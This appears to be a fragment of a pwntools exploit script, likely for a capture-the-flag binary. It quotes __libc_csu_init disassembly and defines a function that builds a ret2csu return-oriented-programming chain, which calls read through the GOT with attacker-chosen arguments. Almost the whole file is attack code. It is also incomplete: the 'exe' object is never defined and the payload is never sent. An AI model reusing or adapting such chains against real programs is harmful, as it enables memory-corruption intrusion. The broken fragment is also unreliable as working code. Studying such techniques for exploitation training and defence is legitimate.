
from pwn import *
from sys import *

"""
.text:0000000000400746 loc_400746:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400746                 add     rsp, 8
.text:000000000040074A                 pop     rbx
.text:000000000040074B                 pop     rbp
.text:000000000040074C                 pop     r12
.text:000000000040074E                 pop     r13
.text:0000000000400750                 pop     r14
.text:0000000000400752                 pop     r15
.text:0000000000400754                 retn
"""

"""
.text:0000000000400730 loc_400730:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400730                 mov     rdx, r15
.text:0000000000400733                 mov     rsi, r14
.text:0000000000400736                 mov     edi, r13d
.text:0000000000400739                 call    qword ptr [r12+rbx*8]
.text:000000000040073D                 add     rbx, 1
.text:0000000000400741                 cmp     rbp, rbx
.text:0000000000400744                 jnz     short loc_400730
"""

def call_ptr(target,edi,rsi,rdx,rbx_after=0,rbp_after=0,r12_after=0,r13_after=0,r14_after=0,r15_after=0):
	payload = p64(0x40074a)
	payload += p64(0)
	payload += p64(1)
	payload += p64(target)
	payload += p64(edi)
	payload += p64(rsi)
	payload += p64(rdx)
	payload += p64(0x400730)
	payload += p64(0)
	payload += p64(rbx_after)
	payload += p64(rbp_after)
	payload += p64(r12_after)
	payload += p64(r13_after)
	payload += p64(r14_after)
	payload += p64(r15_after)
	return payload

call_ptr(exe.got["read"],0,0x601518,0x300)
